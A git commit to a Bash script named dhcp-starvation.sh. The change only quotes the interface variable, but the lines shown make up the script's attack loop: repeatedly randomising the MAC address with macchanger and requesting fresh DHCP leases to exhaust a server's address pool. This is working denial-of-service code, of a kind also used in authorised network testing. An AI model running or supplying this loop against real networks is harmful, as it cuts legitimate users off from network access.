d31cd37bd065213bda9869ce013d0b7594a94878
Raizo62 <silicium62-github@yahoo.fr>
2023-04-13 13:15:44 +0200

    With the bash variables, use the syntax "${Name}" instead of $Name

--- dhcp-starvation.sh
+++ dhcp-starvation.sh
@@ -12,16 +12,16 @@ while true; do
       rm -f /var/run/dhclient.pid
 
       # We disable our interface
-      ip link set $interface down
-      #ifconfig $interface down
+      ip link set "${interface}" down
+      #ifconfig "${interface}" down
 
       # We switch our MAC address for out interface
-      macchanger -a $interface | grep '^New MAC:'
+      macchanger -a "${interface}" | grep '^New MAC:'
 
       # We enable again our interface
-      ip link set $interface up
-      #ifconfig $interface up
+      ip link set "${interface}" up
+      #ifconfig "${interface}" up
 
       # We get a new DHCP Lease
-      dhclient -v $interface 2>&1 | grep DHCPACK
+      dhclient -v "${interface}" 2>&1 | grep DHCPACK
 done
